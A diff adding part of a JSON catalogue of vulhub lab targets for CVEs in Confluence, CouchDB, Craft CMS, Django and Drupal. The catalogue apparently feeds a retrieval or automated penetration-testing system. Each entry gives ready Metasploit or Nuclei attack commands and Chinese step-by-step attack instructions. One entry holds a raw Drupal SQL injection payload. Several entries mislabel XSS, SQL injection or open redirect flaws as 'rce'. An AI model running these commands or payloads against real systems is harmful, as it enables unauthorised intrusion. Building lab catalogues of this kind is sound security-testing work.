+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2023-22515 存在于 confluence 组件中，主要是因为：Atlassian has been made aware of an issue reported by a handful of customers where external attackers may have exploited a previously unknown vulnerability in publicly accessible Confluence Data Ce... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/atlassian_confluence_rce_cve_2023_22515` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8090`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2023-22527",
+    "path": "confluence/CVE-2023-22527",
+    "image": "vulhub/confluence/CVE-2023-22527",
+    "contracts": {
+      "ingress": [
+        8090
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "A template injection vulnerability on older versions of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance. Customers using an affected version must take immediate action.\n\nMost recent supported versions of Confluence Data Center and Server are not affected by this vulnerability as it was ultimately mitigated during regular version updates. However, Atlassian recommends that customers take care to install the latest version to protect their instances from non-critical vulnerabilities outlined in Atlassian’s January Security Bulletin.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/atlassian_confluence_rce_cve_2023_22527",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/atlassian_confluence_rce_cve_2023_22527; set RHOSTS 127.0.0.1; set RPORT 8090; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2023-22527 存在于 confluence 组件中，主要是因为：A template injection vulnerability on older versions of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/atlassian_confluence_rce_cve_2023_22527` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8090`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2017-12635",
+    "path": "couchdb/CVE-2017-12635",
+    "image": "vulhub/couchdb/CVE-2017-12635",
+    "contracts": {
+      "ingress": [
+        5984
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Due to differences in the Erlang-based JSON parser and JavaScript-based JSON parser, it is possible in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit _users documents with duplicate keys for 'roles' used for access control within the database, including the special case '_admin' role, that denotes administrative users. In combination with CVE-2017-12636 (Remote Code Execution), this can be used to give non-admin users access to arbitrary shell commands on the server as the database system user. The JSON parser differences result in behaviour that if two 'roles' keys are available in the JSON, the second one will be used for authorising the document write, but the first 'roles' key is used for subsequent authorization for the newly created user. By design, users can not assign themselves roles. The vulnerability allows non-admin users to give themselves admin privileges.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/apache_couchdb_cmd_exec",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/apache_couchdb_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 5984; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2017-12635 存在于 couchdb 组件中，主要是因为：Due to differences in the Erlang-based JSON parser and JavaScript-based JSON parser, it is possible in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit _users documents with duplicate key... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/apache_couchdb_cmd_exec` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 5984`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2023-41892",
+    "path": "craftcms/CVE-2023-41892",
+    "image": "vulhub/craftcms/CVE-2023-41892",
+    "contracts": {
+      "ingress": [
+        8088
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/craftcms_unauth_rce_cve_2023_41892",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/craftcms_unauth_rce_cve_2023_41892; set RHOSTS 127.0.0.1; set RPORT 8088; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2023-41892 存在于 craftcms 组件中，主要是因为：Craft CMS is a platform for creating digital experiences. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/craftcms_unauth_rce_cve_2023_41892` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8088`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2024-56145",
+    "path": "craftcms/CVE-2024-56145",
+    "image": "vulhub/craftcms/CVE-2024-56145",
+    "contracts": {
+      "ingress": [
+        8088
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. Users of affected versions are affected by this vulnerability if their php.ini configuration has `register_argc_argv` enabled. For these users an unspecified remote code execution vector is present. Users are advised to update to version 3.9.14, 4.13.2, or 5.5.2. Users unable to upgrade should disable `register_argc_argv` to mitigate the issue.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/craftcms_ftp_template",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/craftcms_ftp_template; set RHOSTS 127.0.0.1; set RPORT 8088; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2024-56145 存在于 craftcms 组件中，主要是因为：Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/craftcms_ftp_template` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8088`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2017-12794",
+    "path": "django/CVE-2017-12794",
+    "image": "vulhub/django/CVE-2017-12794",
+    "contracts": {
+      "ingress": [
+        8000
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "In Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5, HTML autoescaping was disabled in a portion of the template for the technical 500 debug page. Given the right circumstances, this allowed a cross-site scripting attack. This vulnerability shouldn't affect most production sites since you shouldn't run with \"DEBUG = True\" (which makes this page accessible) in your production settings.",
+      "exploit_effect": "Security impact exists but specific capability not automatically inferred from NVD data"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2017-12794.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2017-12794.yaml -u http://127.0.0.1:8000",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2017-12794 存在于 django 组件中，主要是因为：In Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5, HTML autoescaping was disabled in a portion of the template for the technical 500 debug page. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2017-12794.yaml -u http://<Target_IP>:8000`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2018-14574",
+    "path": "django/CVE-2018-14574",
+    "image": "vulhub/django/CVE-2018-14574",
+    "contracts": {
+      "ingress": [
+        8000
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "django.middleware.common.CommonMiddleware in Django 1.11.x before 1.11.15 and 2.0.x before 2.0.8 has an Open Redirect.",
+      "exploit_effect": "Security impact exists but specific capability not automatically inferred from NVD data"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2018-14574.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2018-14574.yaml -u http://127.0.0.1:8000",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2018-14574 存在于 django 组件中，主要是因为：django.middleware.common.CommonMiddleware in Django 1.11.x before 1.11.15 and 2.0.x before 2.0.8 has an Open Redirect.. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2018-14574.yaml -u http://<Target_IP>:8000`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2020-9402",
+    "path": "django/CVE-2020-9402",
+    "image": "vulhub/django/CVE-2020-9402",
+    "contracts": {
+      "ingress": [
+        8000
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.",
+      "exploit_effect": "Read/Write database contents"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2020-9402.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2020-9402.yaml -u http://127.0.0.1:8000",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2020-9402 存在于 django 组件中，主要是因为：Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2020-9402.yaml -u http://<Target_IP>:8000`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2021-35042",
+    "path": "django/CVE-2021-35042",
+    "image": "vulhub/django/CVE-2021-35042",
+    "contracts": {
+      "ingress": [
+        8000
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5 allows QuerySet.order_by SQL injection if order_by is untrusted input from a client of a web application.",
+      "exploit_effect": "Read/Write database contents"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2021-35042.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2021-35042.yaml -u http://127.0.0.1:8000",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2021-35042 存在于 django 组件中，主要是因为：Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5 allows QuerySet.order_by SQL injection if order_by is untrusted input from a client of a web application.. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2021-35042.yaml -u http://<Target_IP>:8000`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2014-3704",
+    "path": "drupal/CVE-2014-3704",
+    "image": "vulhub/drupal/CVE-2014-3704",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing crafted keys.",
+      "exploit_effect": "Read/Write database contents"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/drupal_drupageddon",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/drupal_drupageddon; set RHOSTS 127.0.0.1; set RPORT 8080; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5({{num}})),1)%23]=bob&name[0]=a"
+    },
+    "rag_summary": "漏洞 CVE-2014-3704 存在于 drupal 组件中，主要是因为：The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection a... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/drupal_drupageddon` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8080`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2018-7600",
+    "path": "drupal/CVE-2018-7600",
+    "image": "vulhub/drupal/CVE-2018-7600",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/unix/webapp/drupal_drupalgeddon2",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/unix/webapp/drupal_drupalgeddon2; set RHOSTS 127.0.0.1; set RPORT 8080; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2018-7600 存在于 drupal 组件中，主要是因为：Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or ... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/unix/webapp/drupal_drupalgeddon2` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8080`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2018-7602",
+    "path": "drupal/CVE-2018-7602",
+    "image": "vulhub/drupal/CVE-2018-7602",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being compromised. This vulnerability is related to Drupal core - Highly critical - Remote Code Execution - SA-CORE-2018-002. Both SA-CORE-2018-002 and this vulnerability are being exploited in the wild.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2018-7602.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2018-7602.yaml -u http://127.0.0.1:8080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2018-7602 存在于 drupal 组件中，主要是因为：A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2018-7602.yaml -u http://<Target_IP>:8080`，该模板会自动检测目标是否存在此漏洞。"
+  }
+]
